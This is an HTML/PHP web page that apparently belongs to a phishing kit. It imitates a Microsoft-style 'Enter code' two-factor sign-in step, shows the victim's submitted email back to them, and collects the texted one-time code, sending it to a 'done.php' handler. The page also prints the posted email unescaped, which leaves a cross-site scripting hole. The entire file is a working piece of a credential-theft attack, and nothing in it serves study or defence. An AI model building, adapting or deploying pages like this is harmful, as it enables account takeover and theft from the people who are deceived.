<html>
  <head>
    <meta charset="utf-8" />
    <title>Sign in to your account</title>
    <link href="style.css" rel="stylesheet" type="text/css" />
    <link href="img/favicon.ico" rel="shortcut icon" type="image/x-icon" />
  </head>
  <body class="body">
  <div class="centered-block">
      <div class="ms-logo"></div>
      <div class="text-block-2"><?php print($_POST["email"])?></div>
      <h1 class="heading">Enter code</h1>
      <div class="div-block-2">
        <div class="div-block-3"></div>
        <div>We texted your phone +X XXXXXXXXXX. Please enter the code to sign in.</div>
      </div>
      <div class="w-form">
        <form method="get" action="done.php">
          <input type="number" class="text-field w-input" maxlength="6" name="code" placeholder="Code" required="" />
          <label class="w-checkbox"><input type="checkbox" id="checkbox" name="checkbox"class="w-checkbox-input checkbox" />
            <span class="checkbox-label w-form-label" for="checkbox">Don&#x27;t ask again for 14 days</span>
          </label>
          <div class="text-block">Having trouble? <a href="#" class="link">Sign in another way</a></div>
          <div class="text-block"><a href="#" class="link">More information</a></div>
          <div class="div-block">
            <input type="submit" value="Verify" class="submit-button w-button" />
          </div>
        </form>
      </div>
    </div>
  </body>
</html>